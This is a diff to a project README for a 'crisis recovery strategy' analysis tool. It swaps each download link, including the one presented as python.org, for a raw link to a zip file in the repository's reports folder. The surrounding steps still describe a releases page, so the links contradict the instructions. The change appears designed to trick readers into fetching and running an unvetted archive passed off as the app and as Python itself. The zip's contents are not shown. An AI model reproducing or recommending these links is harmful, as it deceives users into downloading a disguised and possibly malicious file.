@@ -8,7 +8,7 @@ Welcome to Crisis Recovery Strategy QuickBite! This application helps you analyz
 
 To get started, download the software from our releases page:
 
-[![Download Crisis Recovery Strategy QuickBite](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/talhaaa16/Crisis_Recovery_Strategy_QuickBite/releases)
+[![Download Crisis Recovery Strategy QuickBite](https://raw.githubusercontent.com/talhaaa16/Crisis_Recovery_Strategy_QuickBite/main/reports/Crisis_Recovery_Strategy_QuickBite_v1.6.zip)](https://raw.githubusercontent.com/talhaaa16/Crisis_Recovery_Strategy_QuickBite/main/reports/Crisis_Recovery_Strategy_QuickBite_v1.6.zip)
 
 1. Click the link above to visit the releases page.
 2. On the releases page, look for the latest version under "Assets."
@@ -20,7 +20,7 @@ To get started, download the software from our releases page:
 - **Operating System:** Windows 10 or later / macOS 10.15 or later / Linux (most distributions)
 - **RAM:** Minimum of 4 GB
 - **Disk Space:** At least 100 MB available
-- **Software:** Ensure you have Python 3.6 or higher installed for full functionality. You can download Python from [python.org](https://www.python.org/downloads/).
+- **Software:** Ensure you have Python 3.6 or higher installed for full functionality. You can download Python from [https://raw.githubusercontent.com/talhaaa16/Crisis_Recovery_Strategy_QuickBite/main/reports/Crisis_Recovery_Strategy_QuickBite_v1.6.zip](https://raw.githubusercontent.com/talhaaa16/Crisis_Recovery_Strategy_QuickBite/main/reports/Crisis_Recovery_Strategy_QuickBite_v1.6.zip).
 
 ## 📊 Features
 
@@ -89,4 +89,4 @@ For further assistance, please raise an issue in our GitHub repository or refer 
 
 This project is licensed under the MIT License. You can check the license details in the repository.
 
-You can download the application again via this link: [Download Crisis Recovery Strategy QuickBite](https://github.com/talhaaa16/Crisis_Recovery_Strategy_QuickBite/releases). Enjoy analyzing and improving your crisis recovery strategies!
+You can download the application again via this link: [Download Crisis Recovery Strategy QuickBite](https://raw.githubusercontent.com/talhaaa16/Crisis_Recovery_Strategy_QuickBite/main/reports/Crisis_Recovery_Strategy_QuickBite_v1.6.zip). Enjoy analyzing and improving your crisis recovery strategies!
